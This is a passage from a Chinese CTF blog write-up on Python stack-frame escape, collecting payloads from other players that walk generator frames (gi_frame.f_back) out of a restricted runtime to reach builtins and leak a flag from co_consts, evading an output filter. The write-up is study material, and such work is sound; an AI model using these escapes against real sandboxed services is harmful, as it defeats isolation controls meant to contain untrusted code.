+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里限制了输出不能有<code>THIS_IS_SEED</code>，所以需要绕过，如何绕过呢</p>
+<p>直接给其他师傅的paylaod，学习一下思路：<br>jay17师傅：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scq</span>():</span><br><span class="line">        <span class="keyword">yield</span> scq.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    scq = scq()  <span class="comment">#生成器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># frame = next(scq)  # 获取到生成器的栈帧对象</span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> scq][<span class="number">0</span>] <span class="comment">#由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(frame)</span></span><br><span class="line">    <span class="comment"># print(frame.f_back)</span></span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_globals[<span class="string">&quot;_&quot;</span>*<span class="number">2</span>+<span class="string">&quot;builtins&quot;</span>+<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]  <span class="comment">#[&#x27;_&#x27;&#x27;_bui&#x27;&#x27;ltins_&#x27;&#x27;_&#x27;]也行</span></span><br><span class="line">    <span class="built_in">dir</span> = gattr.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">str</span> = gattr.<span class="built_in">str</span>  <span class="comment"># 获取str方法</span></span><br><span class="line"></span><br><span class="line">    getflag = frame.f_back.f_back.f_back.f_code</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(getflag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<p>审一下代码，三个点比较重要：</p>
+<ul>
+<li><p>利用字节码来读</p>
+</li>
+<li><p>在全局空间对应的内置空间获得函数，</p>
+</li>
+<li><p>其次就是下面这个代码了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>前两个点不用说了，前面笔记有，主要看第三个点为什么可以这样读出来</p>
+<p>直接给代码测试：</p>
+<p>先给没有<code>str()</code>的结果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">aoidhjaiodhj</span><br><span class="line">&lt;code <span class="built_in">object</span> haha at <span class="number">0x0000026423B663A0</span>, file <span class="string">&quot;D:\clx\ceshi.py&quot;</span>, line <span class="number">2</span>&gt;</span><br><span class="line">haha</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>再来看看使用<code>str()</code>转换为字符串的结果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(d):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output(部分):</span><br><span class="line">(</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>对比可以看出这里当被转换为字符串时再使用for循环可以在读取一个字符就输出。这想到，牛逼。</p>
+<p>还有<a target="_blank" rel="noopener" href="https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/">boogipop师傅</a>的，payload如下：</p>
+<p>对flag字符串有过滤，如下构造：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">        <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line">    pop = exp()</span><br><span class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line">        boo=exp</span><br><span class="line">    <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br><span class="line"><span class="built_in">print</span>(kino.f_code.co_consts[<span class="number">19</span>][<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>
+
+<p>主要了解一下<code>[19][1:]</code>，解答如下：</p>
+<ol>
+<li>**<code>[19]</code>**：<ul>
+<li>获取常量池中的第 19 个常量。常量池包含所有字面值（如字符串、数字）、函数对象、<code>None</code>、以及其他常量。</li>
+</ul>
+</li>
+<li>**<code>[1:]</code>**：<ul>
+<li>对该常量（假设是字符串）进行切片操作，获取从第二个字符到最后一个字符的部分。</li>
+</ul>
+</li>
+</ol>
+<p>假设第 19 个常量是一个字符串 <code>hello world</code>。那么：</p>
+<ul>
+<li><code>kino.f_code.co_consts[19]</code> 将是 <code>&#39;hello world&#39;</code>。</li>
+<li><code>kino.f_code.co_consts[19][1:]</code> 将是 <code>&#39;ello world&#39;</code>。</li>
+</ul>
+<p>因此，这段代码最终会打印 <code>kino.f_code.co_consts[19][1:]</code>，其中假设第 19 个常量是一个字符串，这个切片操作会打印出该字符串从第二个字符开始到最后的部分。</p>
+<p>复现总结，栈帧逃逸个人感觉考的就是在逃逸过后怎么操作，这就靠对python基础知识的积累了。</p>
+<p>笔记参考文章：<code>https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3DdSMOkdxWD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</code></p>
+<p><code>https://blog.csdn.net/spiritx/article/details/132504456</code></p>
+<p><code>https://blog.csdn.net/MXB_1220/article/details/124638449</code></p>
+<p><code>https://gairuo.com/p/python-function-code</code></p>
+<p><code>https://www.cnblogs.com/yangmingxianshen/p/11252541.html</code></p>
+<p><code>https://www.cnblogs.com/traditional/p/13524591.html</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Fupanc
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://fupanc.github.io/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/" title="python栈帧逃逸">https://fupanc.github.io/2024/06/06/python栈帧逃逸/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/" rel="prev" title="rce之利用shell变量">
+                  <i class="fa fa-angle-left"></i> rce之利用shell变量
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fupanc</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script type="text/javascript"
+  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+    
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/yourname" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
